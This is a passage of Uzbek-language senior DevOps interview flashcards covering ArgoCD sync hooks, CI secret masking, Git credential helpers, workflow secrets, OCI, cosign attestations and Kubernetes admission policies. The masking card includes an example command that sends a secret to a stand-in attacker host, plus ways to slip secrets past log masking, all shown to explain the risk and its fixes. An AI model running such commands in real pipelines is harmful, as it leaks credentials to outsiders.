false</pre><pre>kubectl -n api patch deploy api -p '{&quot;spec&quot;:{&quot;template&quot;:{&quot;spec&quot;:{&quot;containers&quot;:[{&quot;name&quot;:&quot;api&quot;,&quot;env&quot;:[{&quot;name&quot;:&quot;DEBUG&quot;,&quot;value&quot;:&quot;1&quot;}]}]}}}}'<br>argocd app get api      # OutOfSync -&gt; bir necha soniyada Synced<br>argocd app history api</pre><p>Vaqtincha to'xtatish (incident): <code>argocd app set api --sync-policy none</code> yoki Flux'da <code>flux suspend kustomization apps</code> — va tugagach <code>flux resume</code>.</p><p><b>Tuzoqlar:</b></p><ul><li>HPA/VPA/operator boshqaradigan maydonlar <code>ignoreDifferences</code>siz — self-heal ular bilan &quot;jang qiladi&quot; (flapping).</li><li>Suspend qilib, resume qilishni unutish — klaster jimgina GitOps'dan chiqadi. Suspended app'lar uchun alert.</li><li>Drift tuzatildi, lekin sababi aniqlanmadi — kim va nega qo'lda o'zgartirdi? Audit log (kube-apiserver audit) va RBAC bilan qo'lda yozishni cheklash.</li></ul><p><b>Senior nuqta:</b> Eng yaxshi drift correction — drift'ning oldini olish: odamlarga prod'da faqat read-only RBAC, break-glass account esa audit va alert bilan. Self-heal — xavfsizlik to'ri, asosiy nazorat emas.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40702	<p>ArgoCD PreSync hook nima?</p>	<p><b>Qisqa javob:</b> PreSync hook — <code>argocd.argoproj.io/hook: PreSync</code> annotation'li resurs (odatda <code>Job</code>): ArgoCD asosiy manifest'larni apply qilishdan <b>oldin</b> uni ishga tushiradi va muvaffaqiyatli tugashini kutadi. Yiqilsa sync to'xtaydi — yangi versiya deploy qilinmaydi.</p><p><b>Muammo:</b> Yangi kod yangi DB ustunini kutadi; migration deploy'dan oldin bajarilmasa pod'lar xato beradi. Yoki: deploy'dan oldin backup olish, feature flag tekshirish.</p><p><b>Qanday ishlaydi:</b></p><pre>sync boshlandi<br>  -&gt; PreSync Job (migrate) -- Running -- Succeeded?<br>        ha  -&gt; Sync phase (Deployment, Service ...)<br>        yo'q -&gt; sync Failed -&gt; SyncFail hook'lari</pre><p><b>Amalda:</b></p><pre>apiVersion: batch/v1<br>kind: Job<br>metadata:<br>  generateName: migrate-          # har sync'da yangi nom<br>  annotations:<br>    argocd.argoproj.io/hook: PreSync<br>    argocd.argoproj.io/hook-delete-policy: HookSucceeded<br>spec:<br>  backoffLimit: 0<br>  activeDeadlineSeconds: 600<br>  template:<br>    spec:<br>      restartPolicy: Never<br>      containers:<br>        - name: migrate<br>          image: org/api:1.5.0<br>          command: [&quot;/app/migrate&quot;, &quot;up&quot;]<br>          envFrom: [{ secretRef: { name: db } }]</pre><pre>argocd app get api --show-operation<br>kubectl -n api logs job/migrate-x7k2p</pre><p><b>Tuzoqlar:</b></p><ul><li>Migration backward-compatible bo'lmasa — PreSync tugagan zahoti eski pod'lar (hali ishlayapti) sinadi. Expand/contract shart.</li><li>Migration idempotent bo'lmasa — retry yoki qayta sync ikki marta bajaradi. Migration tool versiya jadvalidan foydalansin (golang-migrate, Flyway).</li><li>Uzun migration (katta jadvalga index) sync timeout'ga uriladi va lock ushlab qoladi — <code>CREATE INDEX CONCURRENTLY</code> yoki alohida jarayon.</li></ul><p><b>Senior nuqta:</b> PreSync migration'ni ilova relizi bilan bog'laydi — kichik jamoaga qulay. Lekin rollback'da ArgoCD DB'ni orqaga qaytarmaydi; shuning uchun &quot;migration -&gt; kod&quot; tartibida faqat additive o'zgarishlar va destruktiv qismi keyingi relizda.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40703	<p>ArgoCD PostSync hook nima?</p>	<p><b>Qisqa javob:</b> PostSync hook — <code>argocd.argoproj.io/hook: PostSync</code> annotation'li resurs: Sync phase muvaffaqiyatli tugab, barcha resurslar <b>Healthy</b> bo'lgandan keyin ishga tushadi. Odatda smoke test, cache warm-up, bildirishnoma, tashqi tizimni (CDN purge) yangilash.</p><p><b>Muammo:</b> &quot;Sync Succeeded&quot; = manifest'lar apply qilindi va pod'lar ready. Lekin ilova haqiqatan to'g'ri ishlayaptimi (login ishlaydimi, DB'ga yozadimi) — buni alohida tekshirish kerak.</p><p><b>Qanday ishlaydi:</b></p><pre>PreSync -&gt; Sync (wave'lar) -&gt; hammasi Healthy?<br>   ha -&gt; PostSync Job (smoke test) -&gt; Succeeded -&gt; operation Succeeded<br>                                   -&gt; Failed    -&gt; operation Failed (SyncFail ishga tushadi)</pre><p><b>Amalda:</b></p><pre>apiVersion: batch/v1<br>kind: Job<br>metadata:<br>  name: smoke-test<br>  annotations:<br>    argocd.argoproj.io/hook: PostSync<br>    argocd.argoproj.io/hook-delete-policy: BeforeHookCreation<br>spec:<br>  backoffLimit: 2<br>  template:<br>    spec:<br>      restartPolicy: Never<br>      containers:<br>        - name: smoke<br>          image: curlimages/curl:8.10.1<br>          command: [&quot;sh&quot;, &quot;-c&quot;]<br>          args:<br>            - curl -fsS --retry 5 --retry-delay 3 http://api.api.svc/healthz &amp;&amp;<br>              curl -fsS http://api.api.svc/v1/version | grep 1.5.0</pre><p>Bildirishnoma uchun hook o'rniga ArgoCD Notifications (<code>on-deployed</code> trigger) qulayroq.</p><p><b>Tuzoqlar:</b></p><ul><li>PostSync yiqilsa ham yangi versiya allaqachon ishlab turibdi — bu avtomatik rollback <b>emas</b>. Rollback kerak bo'lsa Argo Rollouts analiz yoki alohida mexanizm.</li><li><code>HookSucceeded</code> delete policy — yiqilgan Job qoladi (log ko'rish uchun yaxshi), keyingi sync'da nom to'qnashadi; <code>BeforeHookCreation</code> qo'sh.</li><li>Smoke test prod ma'lumotini o'zgartirmasin — faqat read-only yoki test tenant.</li></ul><p><b>Senior nuqta:</b> PostSync — tez &quot;sanity check&quot;, progressive delivery o'rnini bosmaydi. Kuchli zanjir: PostSync smoke test + SLO alert'lari + Rollouts canary analiz.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40704	<p>ArgoCD SyncFail hook nima?</p>	<p><b>Qisqa javob:</b> SyncFail hook — <code>argocd.argoproj.io/hook: SyncFail</code> annotation'li resurs: sync operatsiyasi yiqilganda (PreSync/Sync/PostSync bosqichlarining birida) ishga tushadi. Vazifasi — tozalash, ogohlantirish yoki kompensatsiya (masalan, PreSync'da qo'yilgan maintenance flag'ni olib tashlash).</p><p><b>Muammo:</b> PreSync'da &quot;maintenance mode ON&quot; qilding, keyin Sync yiqildi — sayt maintenance rejimida qolib ketadi. Yoki jamoa sync yiqilganini bilmaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>PreSync ok -&gt; Sync: Deployment invalid -&gt; FAILED<br>                                  |<br>                                  v<br>                       SyncFail Job(lar) ishga tushadi<br>                       (operation baribir Failed bo'lib qoladi)</pre><p><b>Amalda:</b></p><pre>apiVersion: batch/v1<br>kind: Job<br>metadata:<br>  generateName: sync-fail-cleanup-<br>  annotations:<br>    argocd.argoproj.io/hook: SyncFail<br>    argocd.argoproj.io/hook-delete-policy: HookSucceeded<br>spec:<br>  template:<br>    spec:<br>      restartPolicy: Never<br>      containers:<br>        - name: cleanup<br>          image: org/ops-tools:1.2<br>          command: [&quot;sh&quot;, &quot;-c&quot;, &quot;ops maintenance off &amp;&amp; ops notify '#deploys' 'api sync failed'&quot;]</pre><pre>argocd app get api --show-operation     # Phase: Failed, qaysi bosqichda</pre><p><b>Tuzoqlar:</b></p><ul><li>SyncFail avtomatik rollback qilmaydi — klaster qisman yangilangan holatda bo'lishi mumkin. Rollback = <code>git revert</code> yoki <code>argocd app rollback</code>.</li><li>SyncFail Job'ning o'zi yiqilsa — qo'shimcha xabar yo'q; uni oddiy va ishonchli qil.</li><li>Bildirishnoma uchun ArgoCD Notifications (<code>on-sync-failed</code> trigger) hook'dan soddaroq va ishonchliroq.</li></ul><p><b>Senior nuqta:</b> Hook'lar orasidagi &quot;tranzaksiya&quot; yo'q: PreSync qilgan har o'zgarish uchun SyncFail'da kompensatsiya (saga g'oyasi) o'ylab qo'y. Eng yaxshisi — PreSync'da qaytarib bo'lmaydigan o'zgarish qilmaslik.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40705	<p>Secret masking'ni chetlab o'tish xavfi nima?</p>	<p><b>Qisqa javob:</b> CI masking — log'da secret qiymatini aniq satr mosligi bo'yicha <code>*<b></code> bilan almashtirish. U faqat </b>aynan o'sha** satrni taniydi: secret base64/URL-encode qilinsa, bo'laklarga bo'linsa, teskari yozilsa, JSON ichida escape qilinsa yoki ko'p qatorli bo'lsa — log'da ochiq chiqadi. Masking — oxirgi himoya chizig'i, xavfsizlik nazorati emas.</p><p><b>Muammo:</b> Hujumchi (yoki tasodif) secret'ni log'ga chiqarsa, public repo log'ini hamma o'qiydi; zararli PR yoki dependency esa masking'ni ataylab aylanib o'tadi.</p><p><b>Qanday ishlaydi:</b></p><pre>secret = &quot;s3cr3t&quot;<br>echo $SECRET             -&gt; ***            (maskalangan)<br>echo $SECRET | base64    -&gt; czNjcjN0Cg==   (OCHIQ)<br>echo ${SECRET:0:3} ${SECRET:3}  -&gt; s3c r3t (OCHIQ)<br>curl https://evil.com/?k=$SECRET  -&gt; log'da ko'rinmaydi, lekin sizib chiqdi</pre><p><b>Amalda (GitHub Actions):</b></p><pre># runtime'da hosil bo'lgan qiymatni ham mask qilish<br>TOKEN=$(vault read -field=token secret/ci)<br>echo &quot;::add-mask::$TOKEN&quot;<br>echo &quot;$TOKEN&quot; | base64 | xargs -I{} echo &quot;::add-mask::{}&quot;   # hosilalarini ham</pre><pre>permissions: { contents: read }      # GITHUB_TOKEN minimal<br>env: {}                               # secret'ni faqat kerakli step'ga ber<br>steps:<br>  - run: ./deploy.sh<br>    env: { API_KEY: ${{ secrets.API_KEY }} }</pre><p><b>Tuzoqlar:</b></p><ul><li><code>set -x</code> yoki debug log (<code>ACTIONS_STEP_DEBUG</code>) — buyruq argumentlari bilan secret chiqadi.</li><li>Strukturali secret (JSON service account key) — har maydoni alohida mask qilinmaydi; butun JSON'ni secret qilib, ichidagi <code>private_key</code> boshqa formatda chiqishi mumkin.</li><li>Artifact, cache, test report'larga secret yozilsa — masking ularga umuman tegmaydi.</li></ul><p><b>Senior nuqta:</b> Haqiqiy himoya: secret'ni ishonchsiz kod ishlaydigan job'ga umuman bermaslik, qisqa muddatli OIDC credential'lar (sizib chiqsa ham tez eskiradi), egress cheklovi va secret scanning. Sizib chiqqan bo'lsa — mask emas, <b>rotate</b>.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40706	<p>CI'da Git credential helper nima?</p>	<p><b>Qisqa javob:</b> Git credential helper — Git autentifikatsiya so'raganda (HTTPS) login/token'ni qayerdan olishni hal qiluvchi tashqi dastur (<code>git credential-&lt;name&gt;</code>). CI'da u orqali qisqa muddatli token (GitHub App installation token, CI job token) beriladi — parol URL'ga yoki <code>.git/config</code>ga hardcode qilinmaydi.</p><p><b>Muammo:</b> <code>git clone https://user:TOKEN@github.com/...</code> — token <code>.git/config</code>da, process ro'yxatida (<code>ps</code>), log'da va artifact'larda qoladi. Shaxsiy PAT esa uzoq yashaydi va odamga bog'langan.</p><p><b>Qanday ishlaydi:</b></p><pre>git fetch --&gt; &quot;github.com uchun credential kerak&quot;<br>  --&gt; credential.helper &quot;get&quot; (protocol, host, path stdin orqali)<br>  &lt;-- username=x-access-token, password=&lt;1 soatlik token&gt;<br>git --&gt; HTTPS Authorization header</pre><p><b>Amalda:</b></p><pre># helper sifatida oddiy skript: token'ni env'dan beradi, diskka yozmaydi<br>git config --global credential.helper \<br>  '!f() { echo username=x-access-token; echo &quot;password=${GH_TOKEN}&quot;; }; f'<br>git clone https://github.com/org/private-lib.git<br><br># GitHub CLI helper<br>gh auth setup-git<br><br># Go private modullar uchun<br>git config --global url.&quot;https://x-access-token:${GH_TOKEN}@github.com/&quot;.insteadOf &quot;https://github.com/&quot;   # kamroq xavfsiz variant</pre><p>GitHub App token olish (Actions): <code>actions/create-github-app-token@v1</code> -&gt; 1 soatlik, faqat kerakli repo'larga.</p><p><b>Tuzoqlar:</b></p><ul><li><code>credential.helper store</code> — token <code>~/.git-credentials</code>da ochiq matn; persistent runner'da keyingi job o'qiydi.</li><li><code>actions/checkout</code> default'da <code>GITHUB_TOKEN</code>ni <code>.git/config</code>ga yozadi — keyingi step'lar (va zararli dependency) uni o'qiy oladi. <code>persist-credentials: false</code> qo'y.</li><li><code>insteadOf</code> URL'ga token joylash — xato xabarlarida token chiqishi mumkin.</li></ul><p><b>Senior nuqta:</b> Maqsad — CI'da uzoq muddatli Git credential umuman bo'lmasligi: GitHub App (repo'ga scoped, 1 soat), GitLab <code>CI_JOB_TOKEN</code>, deploy key faqat read-only. Bot akkaunt PAT'i — oxirgi chora.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40707	<p>Reusable workflow'da <code>secrets: inherit</code> nima?</p>	<p><b>Qisqa javob:</b> <code>secrets: inherit</code> — GitHub Actions'da reusable workflow chaqirilganda chaqiruvchi workflow'ga ochiq bo'lgan <b>barcha</b> secret'larni (repo, environment emas, org) nomma-nom uzatish. Qulay, lekin least privilege'ga zid: chaqirilgan workflow o'ziga kerak bo'lmagan secret'larni ham oladi.</p><p><b>Muammo:</b> 20 ta secret'ni bittalab <code>secrets:</code> bilan uzatish noqulay; <code>inherit</code> buni yengillashtiradi. Ammo reusable workflow boshqa repo'da (yoki tag bilan) bo'lsa va o'zgartirilsa — u barcha secret'larga kirish oladi.</p><p><b>Qanday ishlaydi:</b></p><pre>caller (org/app)  secrets: AWS_ROLE, NPM_TOKEN, SLACK_URL, PROD_DB_PASS<br>   uses: org/ci/.github/workflows/build.yml@v2<br>      secrets: inherit   --&gt; build.yml hammasini ko'radi (faqat NPM_TOKEN kerak edi)</pre><p><b>Amalda:</b></p><pre># Yomon: hammasi uzatiladi<br>jobs:<br>  build:<br>    uses: org/ci/.github/workflows/build.yml@v2<br>    secrets: inherit</pre><pre># Yaxshi: aniq ro'yxat va pinning<br>jobs:<br>  build:<br>    uses: org/ci/.github/workflows/build.yml@3f1c2a9e8b...   # commit SHA<br>    secrets:<br>      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}</pre><p>Reusable workflow tomonda:</p><pre>on:<br>  workflow_call:<br>    secrets:<br>      NPM_TOKEN: { required: true }</pre><p><b>Tuzoqlar:</b></p><ul><li>Reusable workflow'ni <code>@main</code> bilan chaqirish + <code>inherit</code> — boshqa repo'ga push qila oladigan har kim sizning secret'laringizni oladi.</li><li><code>inherit</code> faqat bir xil org/enterprise ichida ishlaydi; tashqi workflow'ga baribir aniq uzatiladi.</li><li>Environment secret'lari job <code>environment:</code> orqali alohida keladi — inherit ularni boshqarmaydi.</li></ul><p><b>Senior nuqta:</b> Secret'lardan ham yaxshisi — OIDC: reusable workflow <code>id-token: write</code> bilan cloud role'ni o'zi oladi, role trust policy esa <code>job_workflow_ref</code> claim'i bo'yicha aynan shu workflow'ga ruxsat beradi. Bu &quot;qaysi workflow qaysi role'ni ola oladi&quot;ni aniq bog'laydi.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40708	<p>Container layer squashing nima?</p>	<p><b>Qisqa javob:</b> Layer squashing — image'ning barcha (yoki bir nechta) layer'larini bitta layer'ga birlashtirish. Foyda: oldingi layer'da yaratilib keyin o'chirilgan fayllar (build tool, cache, secret!) haqiqatan yo'qoladi va hajm kamayadi. Zarar: layer cache va registry'da layer'larni qayta ishlatish yo'qoladi. Bugun odatda <b>multi-stage build</b> afzal.</p><p><b>Muammo:</b> Har <code>RUN</code>/<code>COPY</code> alohida layer. <code>RUN rm -rf /tmp/build</code> faylni faqat yuqori layer'da &quot;whiteout&quot; bilan yashiradi — pastki layer'da u baribir bor va image hajmini oshiradi (<code>docker save</code> bilan olinishi ham mumkin).</p><p><b>Qanday ishlaydi:</b></p><pre>oddiy:   L1 base | L2 +500MB toolchain | L3 build | L4 rm toolchain (whiteout)  -&gt; 700MB<br>squash:  L1 base | L2 (L2+L3+L4 natijasi)                                      -&gt; 200MB<br>multi-stage: stage &quot;build&quot; (toolchain) --COPY --from=build /app--&gt; stage &quot;final&quot; (distroless) -&gt; 30MB</pre><p><b>Amalda:</b></p><pre>FROM golang:1.23 AS build<br>WORKDIR /src<br>COPY go.mod go.sum ./<br>RUN go mod download<br>COPY . .<br>RUN CGO_ENABLED=0 go build -o /app ./cmd/api<br><br>FROM gcr.io/distroless/static-debian12:nonroot<br>COPY --from=build /app /app<br>ENTRYPOINT [&quot;/app&quot;]</pre><pre>docker history org/api:1.5.0          # layer'lar va hajmlari<br>dive org/api:1.5.0                    # isrof qilingan joyni ko'rish<br>docker build --squash .               # eski, experimental (classic builder), BuildKit'da qo'llanmaydi</pre><p><b>Tuzoqlar:</b></p><ul><li>Secret'ni <code>COPY</code> qilib keyin <code>rm</code> — u baribir layer tarixida. BuildKit <code>--mount=type=secret</code> ishlat.</li><li>Squash qilingan image — har versiyada butun layer qayta push/pull bo'ladi, base image ham ulashilmaydi.</li><li><code>--squash</code> BuildKit/buildx'da yo'q — eski maqolalarga ishonma.</li></ul><p><b>Senior nuqta:</b> To'g'ri tartib: multi-stage + minimal final base (distroless/chainguard/alpine) + o'zgarmas narsalarni (dependency) yuqori layer'larga, tez o'zgaradigan kodni pastga. Bu ham kichik image, ham yaxshi cache beradi.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40709	<p>Multi-arch container build nima?</p>	<p><b>Qisqa javob:</b> Multi-arch build — bitta Dockerfile'dan bir nechta platforma (<code>linux/amd64</code>, <code>linux/arm64</code>, ...) uchun image'lar yaratib, ularni bitta tag ostida <b>manifest list (OCI image index)</b> sifatida push qilish. <code>docker pull</code> qilganda runtime o'z arxitekturasiga mos variantni avtomatik tanlaydi.</p><p><b>Muammo:</b> Graviton/Ampere (arm64) node'lar arzonroq, developer'lar Apple Silicon'da; amd64-only image arm64 node'da <code>exec format error</code> beradi.</p><p><b>Qanday ishlaydi:</b></p><pre>org/api:1.5.0 (index)<br>  +-- linux/amd64 -&gt; manifest sha256:aaa (layers)<br>  +-- linux/arm64 -&gt; manifest sha256:bbb (layers)<br>build usullari:<br>  - QEMU emulyatsiya (sodda, lekin 5-20x sekin)<br>  - cross-compile (Go/Rust: GOARCH bilan, tez)<br>  - native builder node'lar (har arxitektura o'z mashinasida)</pre><p><b>Amalda:</b></p><pre>docker buildx create --use --name multi<br>docker buildx build --platform linux/amd64,linux/arm64 -t ghcr.io/org/api:1.5.0 --push .<br>docker buildx imagetools inspect ghcr.io/org/api:1.5.0</pre><p>Cross-compile bilan tezlashtirish:</p><pre>FROM --platform=$BUILDPLATFORM golang:1.23 AS build<br>ARG TARGETOS TARGETARCH<br>WORKDIR /src<br>COPY . .<br>RUN GOOS=$TARGETOS GOARCH=$TARGETARCH CGO_ENABLED=0 go build -o /app ./cmd/api<br>FROM gcr.io/distroless/static-debian12<br>COPY --from=build /app /app<br>ENTRYPOINT [&quot;/app&quot;]</pre><p><b>Tuzoqlar:</b></p><ul><li>QEMU bilan og'ir build (C extension, npm native modul) — CI 40+ daqiqa. Native arm64 runner'lar (GitHub <code>ubuntu-24.04-arm</code>) yoki cross-compile.</li><li><code>--load</code> bilan multi-platform image'ni lokal Docker'ga yuklab bo'lmaydi (containerd image store yoqilmagan bo'lsa) — <code>--push</code> kerak.</li><li>Base image barcha platformani qo'llamasa build yiqiladi; har platformada test ham qil.</li></ul><p><b>Senior nuqta:</b> Imzolash va SBOM'ni index darajasida va har platforma manifest'i uchun qil; admission policy digest bo'yicha tekshirganda index digest'i ishlatilishini bil.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40710	<p>OCI (Open Container Initiative) nima?</p>	<p><b>Qisqa javob:</b> OCI (Open Container Initiative, Linux Foundation, 2015) — container'lar uchun ochiq standartlar: <b>Image Spec</b> (manifest, config, layer formati, image index), <b>Runtime Spec</b> (container'ni qanday ishga tushirish — <code>config.json</code> + rootfs bundle; reference: runc) va <b>Distribution Spec</b> (registry HTTP API: push/pull). Bu Docker, Podman, containerd, CRI-O, BuildKit, Kaniko, registry'larning o'zaro mosligini ta'minlaydi.</p><p><b>Muammo:</b> Standart bo'lmasa har tool o'z formatiga bog'lanadi: Podman'da build qilingan image containerd'da ishlamasligi mumkin edi.</p><p><b>Qanday ishlaydi:</b></p><pre>build tool (BuildKit, Kaniko, Buildah) --Image Spec--&gt; image<br>   --Distribution Spec (HTTP API)--&gt; registry (Harbor, ECR, GHCR)<br>   --pull--&gt; containerd/CRI-O --unpack--&gt; bundle --Runtime Spec--&gt; runc/crun/gVisor/kata</pre><p>Image Spec v1.1 (2024): <code>artifactType</code> va <code>subject</code> maydonlari — imzo, SBOM, attestation'larni image'ga &quot;referrer&quot; sifatida bog'lash (Referrers API).</p><p><b>Amalda:</b></p><pre>crane manifest ghcr.io/org/api:1.5.0 | jq .mediaType   # application/vnd.oci.image.index.v1+json<br>oras push ghcr.io/org/artifacts:sbom sbom.json:application/spdx+json   # istalgan artifact<br>oras discover ghcr.io/org/api@sha256:...               # bog'langan imzo/SBOM'lar<br>skopeo copy docker://ghcr.io/org/api:1.5.0 oci:./api-oci  # OCI layout'ga</pre><p><b>Tuzoqlar:</b></p><ul><li>Docker v2 manifest va OCI manifest — o'xshash, lekin media type'lari farq qiladi; eski registry'lar OCI index/artifact'larni qo'llamasligi mumkin.</li><li>&quot;OCI image&quot; = &quot;Docker image&quot; deb hisoblash odatda to'g'ri, lekin Docker'ga xos maydonlar (HEALTHCHECK) OCI config'da yo'q.</li><li>Registry Referrers API'ni qo'llamasa, cosign tag-asosidagi fallback (<code>sha256-&lt;digest&gt;.sig</code>) ishlatadi.</li></ul><p><b>Senior nuqta:</b> OCI registry endi universal artifact ombori: Helm chart (OCI), Flux manifest'lari (OCIRepository), WASM modullar, SBOM, imzolar. Bu supply chain'ni bitta registry va bitta access control atrofida birlashtirishga imkon beradi.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40711	<p>Cosign attestation nima?</p>	<p><b>Qisqa javob:</b> Cosign attestation — image digest'iga bog'langan, imzolangan in-toto <b>statement</b>: &quot;bu image haqida X da'vo qilinadi&quot; (predicate: SBOM, SLSA provenance, vuln scan natijasi, test natijasi, custom). Oddiy imzo &quot;kim imzoladi&quot;ni, attestation esa &quot;image haqida nima ma'lum&quot;ni isbotlaydi.</p><p><b>Muammo:</b> Admission policy faqat &quot;imzolanganmi?&quot; deb so'rasa yetmaydi. &quot;SBOM bormi? Critical CVE yo'qmi? Bizning CI'da, main branch'dan build qilinganmi?&quot; — bularni tekshirish uchun imzolangan metadata kerak.</p><p><b>Qanday ishlaydi:</b></p><pre>predicate (sbom.json) --&gt; in-toto Statement {subject: image digest, predicateType, predicate}<br>   --&gt; DSSE envelope + imzo (keyless) --&gt; registry (referrer / .att tag) + Rekor<br>verify-attestation --&gt; imzo ok? identity ok? predicate policy (CUE/Rego) ok?</pre><p><b>Amalda:</b></p><pre>IMG=ghcr.io/org/api@sha256:abc...<br>cosign attest --yes --type cyclonedx --predicate sbom.cdx.json $IMG<br>cosign attest --yes --type slsaprovenance1 --predicate provenance.json $IMG<br>cosign attest --yes --type vuln --predicate grype.json $IMG<br><br>cosign verify-attestation --type cyclonedx \<br>  --certificate-identity-regexp '^https://github.com/org/' \<br>  --certificate-oidc-issuer https://token.actions.githubusercontent.com \<br>  $IMG | jq -r .payload | base64 -d | jq .predicateType</pre><p>Kyverno'da: <code>verifyImages[].attestations[]</code> bilan <code>predicateType</code> va shartlar (masalan scan natijasida <code>critical == 0</code>).</p><p><b>Tuzoqlar:</b></p><ul><li>Attestation build'dan alohida (boshqa job, boshqa identity) qilinsa — kim yaratganini aniq tekshir; aks holda har kim &quot;toza scan&quot; attestation qo'sha oladi.</li><li>Vuln scan attestation vaqt o'tishi bilan eskiradi — yangi CVE chiqadi. Policy'da attestation yoshini tekshir.</li><li>Tag'ga attestation qilish — digest ishlat.</li></ul><p><b>Senior nuqta:</b> Attestation'lar zanjiri (provenance + SBOM + scan) va admission'da ularni tekshirish — SLSA'ni &quot;hujjat&quot;dan &quot;majburiy nazorat&quot;ga aylantiradi. GitHub <code>actions/attest-*</code> va <code>gh attestation verify</code> xuddi shu formatni ishlatadi.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40712	<p>Kyverno <code>ClusterPolicy</code> va <code>Policy</code> farqi.</p>	<p><b>Qisqa javob:</b> Kyverno'da <code>ClusterPolicy</code> — cluster-scoped resurs, butun klasterdagi (barcha namespace va cluster-scoped resurslar) obyektlarga qo'llanadi; <code>Policy</code> — namespaced resurs, faqat o'zi turgan namespace'dagi resurslarga ta'sir qiladi. Qoidalar sintaksisi bir xil.</p><p><b>Muammo:</b> Platform jamoa butun klaster uchun majburiy qoidalar (privileged taqiq, imzolangan image) o'rnatadi; ilova jamoasi esa o'z namespace'ida qo'shimcha qoida xohlaydi — lekin boshqalarga ta'sir qilmasligi kerak.</p><p><b>Qanday ishlaydi:</b></p><p>| | ClusterPolicy | Policy | |---|---|---| | Scope | Klaster | Bitta namespace | | Kim yaratadi (RBAC) | Platform/cluster-admin | Namespace egasi (agar ruxsat berilsa) | | Cluster-scoped resurslar (Namespace, ClusterRole) | Ha | Yo'q | | <code>generate</code> boshqa namespace'ga | Ha | Faqat o'z namespace'iga |</p><p><b>Amalda:</b></p><pre>apiVersion: kyverno.io/v1<br>kind: ClusterPolicy<br>metadata: { name: disallow-privileged }<br>spec:<br>  validationFailureAction: Enforce<br>  rules:<br>    - name: no-privileged<br>      match: { any: [{ resources: { kinds: [Pod] } }] }<br>      exclude: { any: [{ resources: { namespaces: [kube-system] } }] }<br>      validate:<br>        message: &quot;privileged container taqiqlangan&quot;<br>        pattern:<br>          spec:<br>            containers:<br>              - =(securityContext):<br>                  =(privileged): &quot;false&quot;<br>---<br>apiVersion: kyverno.io/v1<br>kind: Policy<br>metadata: { name: require-team-label, namespace: payments }<br>spec:<br>  validationFailureAction: Audit<br>  rules:<br>    - name: team-label<br>      match: { any: [{ resources: { kinds: [Deployment] } }] }<br>      validate: { message: &quot;team label kerak&quot;, pattern: { metadata: { labels: { team: &quot;?*&quot; } } } }</pre><pre>kubectl get cpol,pol -A<br>kubectl get policyreport -n payments</pre><p><b>Tuzoqlar:</b></p><ul><li>Namespace egasiga <code>Policy</code> yaratish ruxsatini berish — u o'z <code>Policy</code>si bilan ClusterPolicy'ni bekor qila olmaydi, lekin <code>mutate</code> bilan resurslarni kutilmagan tarzda o'zgartirishi mumkin.</li><li>ClusterPolicy'da <code>exclude</code> qilmaslik — system namespace'lar bloklanadi.</li><li>Kyverno 1.13+ da <code>ValidatingPolicy</code> va boshqa yangi CEL-asosli turlar ham bor — versiyaga qarab tanla.</li></ul><p><b>Senior nuqta:</b> Asosiy guardrail'lar — ClusterPolicy'da va Git'da (GitOps), namespace Policy'lar — jamoalarning o'z qo'shimchalari. Har yangi ClusterPolicy avval <code>Audit</code>, PolicyReport'lar ko'rilgach <code>Enforce</code>.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40713	<p>OPA Gatekeeper ConstraintTemplate nima?</p>	<p><b>Qisqa javob:</b> OPA Gatekeeper'da <code>ConstraintTemplate</code> — yangi policy <b>turi</b>ni belgilaydigan CRD: ichida Rego logikasi va parametrlar sxemasi bor. Uni apply qilsang Gatekeeper yangi CRD yaratadi (masalan <code>K8sRequiredLabels</code>); shu turdagi <b>Constraint</b> resurslari esa qoidani aniq parametrlar va qamrov (<code>match</code>) bilan ishga tushiradi.</p><p><b>Muammo:</b> Bir xil mantiq (&quot;label majburiy&quot;) turli namespace'larda turli label'lar bilan kerak. Logikani bir marta yozib, ko'p marta parametr bilan ishlatish — template/instance ajratish.</p><p><b>Qanday ishlaydi:</b></p><pre>ConstraintTemplate (Rego + schema) --&gt; CRD: K8sRequiredLabels<br>   Constraint A: kinds=[Namespace], labels=[owner]<br>   Constraint B: kinds=[Deployment], namespaces=[prod], labels=[team, tier]<br>admission request --&gt; Gatekeeper --&gt; mos Constraint'lar --&gt; Rego violation? deny/warn/dryrun<br>audit: mavjud resurslarni davriy tekshirib status'ga yozadi</pre><p><b>Amalda:</b></p><pre>apiVersion: templates.gatekeeper.sh/v1<br>kind: ConstraintTemplate<br>metadata: { name: k8srequiredlabels }<br>spec:<br>  crd:<br>    spec:<br>      names: { kind: K8sRequiredLabels }<br>      validation:<br>        openAPIV3Schema:<br>          type: object<br>          properties: { labels: { type: array, items: { type: string } } }<br>  targets:<br>    - target: admission.k8s.gatekeeper.sh<br>      rego: |<br>        package k8srequiredlabels<br>        violation[{&quot;msg&quot;: msg}] {<br>          required := {l | l := input.parameters.labels[_]}<br>          provided := {l | input.review.object.metadata.labels[l]}<br>          missing := required - provided<br>          count(missing) &gt; 0<br>          msg := sprintf(&quot;label yetishmaydi: %v&quot;, [missing])<br>        }<br>---<br>apiVersion: constraints.gatekeeper.sh/v1beta1<br>kind: 